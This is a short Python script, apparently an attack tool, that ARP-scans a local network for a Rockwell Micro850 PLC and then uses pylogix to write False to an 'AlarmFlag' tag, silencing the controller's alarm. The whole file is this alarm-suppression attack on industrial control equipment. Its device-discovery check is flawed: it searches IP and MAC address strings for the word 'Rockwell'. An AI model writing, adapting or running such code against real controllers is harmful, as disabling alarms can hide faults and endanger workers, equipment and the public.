from pylogix import PLC
from scapy.all import ARP, Ether, srp

# Step 1: Discover the PLC's IP Address by scanning the network
def find_plc_ip(network="192.168.1.0/24"):
    print("[*] Scanning network to locate the Rockwell Micro850 PLC...")
    
    # Create an ARP request
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Send packet and receive response
    result = srp(ether / arp, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        if "Rockwell" in received.psrc or "Rockwell" in received.hwsrc:
            print(f"[+] Found potential PLC at IP: {received.psrc}")
            return received.psrc
    
    print("[!] No Rockwell PLC found on the network.")
    return None

# Step 2: Suppress Alarms Through PLC Communication
def suppress_alarm(plc_ip, alarm_tag="AlarmFlag"):
    if not plc_ip:
        print("[!] PLC IP not found. Cannot suppress alarms.")
        return
    
    print(f"[*] Connecting to PLC at {plc_ip}...")
    
    with PLC() as comm:
        comm.IPAddress = plc_ip  # Set the dynamically found PLC IP

        # Read the alarm flag/tag
        alarm_status = comm.Read(alarm_tag)

        if alarm_status.Status == 'Success':
            print(f"[+] Current Alarm Status: {alarm_status.Value}")
            
            # Suppress the alarm (Set it to False / 0)
            comm.Write(alarm_tag, False)
            print(f"[+] Alarm '{alarm_tag}' has been suppressed.") 
        else:
            print("[!] Failed to read the alarm tag. Ensure the tag exists.")

# **RUN SCRIPT**
if __name__ == "__main__":
    plc_ip = find_plc_ip()  # Discover the PLC's IP
    suppress_alarm(plc_ip, "AlarmFlag")  # Modify the alarm flag/tag